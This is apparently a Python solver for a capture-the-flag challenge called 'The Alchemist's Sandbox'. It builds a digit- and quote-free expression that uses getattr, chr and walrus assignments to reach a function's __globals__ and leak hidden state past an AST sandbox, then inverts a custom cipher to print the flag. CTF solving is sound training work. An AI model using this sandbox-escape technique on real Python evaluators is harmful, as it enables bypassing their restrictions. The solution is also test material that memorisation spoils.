#!/usr/bin/env python3
"""NXF CTF - The Alchemist's Sandbox solver.

Place this file next to the challenge's chall.py and run:
    python alchemist_solve.py
"""

import struct
from chall import _VAULT_STATE, _encrypt_vault, _rol16, run_sandbox

# Valid expression under the challenge's AST / character restrictions.
# It obtains als.__globals__ using getattr + chr, then reads _VAULT_STATE.
PAYLOAD = (
    '((a:=True),(b:=a<<a),(d:=b<<a),(e:=d<<a),(f:=e<<a),'
    '(h:=f<<a),(j:=h<<a),(k:=j+h),(u:=chr(k-a)),'
    'getattr(als,u+u+chr(k+a+b+d)+chr(k+d+e)+chr(k+a+b+d+e)'
    '+chr(k+b)+chr(k+a)+chr(k+d+e)+chr(k+a+b+f)+u+u)'
    '[u+chr(k-e-b)+chr(j+a)+chr(k-e-b-a)+chr(j+e+d)'
    '+chr(k-e-d)+u+chr(k-e-d-a)+chr(k-e-d)+chr(j+a)'
    '+chr(k-e-d)+chr(j+d+a)])[-a]'
)


def ror16(value: int, amount: int) -> int:
    return ((value >> amount) | (value << (16 - amount))) & 0xFFFF


def decrypt_vault(encrypted: list[int]) -> bytes:
    words = encrypted[:]
    assert len(words) == 21

    for r in range(31, -1, -1):
        # Invert the forward permutation new[i] = old[(4*i) % 21].
        previous_order = [0] * 21
        for i in range(21):
            previous_order[(i * 4) % 21] = words[i]
        words = previous_order

        rc = ((r * 0x9E37) + 0x7F4A) & 0xFFFF
        # Forward processing was left to right and depends on prev word.
        # Reverse from right to left to recover the correct prev values.
        for i in range(20, -1, -1):
            prev = words[(i - 1) % 21]
            shift = (r + i) % 15 + 1
            mix = _rol16((prev * 257 + rc + i * 17) & 0xFFFF, shift)
            words[i] = (((ror16(words[i], 5) - rc) & 0xFFFF) ^ mix)

    return struct.pack(">21H", *words)


def main() -> None:
    assert len(PAYLOAD) <= 1024
    assert not any(char in PAYLOAD for char in '0123456789"\'')
    leaked_state = run_sandbox(PAYLOAD)
    assert leaked_state == _VAULT_STATE, "AST payload did not leak expected state"

    flag_bytes = decrypt_vault(leaked_state)
    assert len(flag_bytes) == 42
    assert _encrypt_vault(flag_bytes) == leaked_state, "Round-trip verification failed"

    print(f"Sandbox bypass: PASS ({len(PAYLOAD)} characters)")
    print(f"Ciphertext extracted: {leaked_state}")
    print(f"Encryption round-trip: PASS")
    print(f"Flag: {flag_bytes.decode('ascii')}")


if __name__ == "__main__":
    main()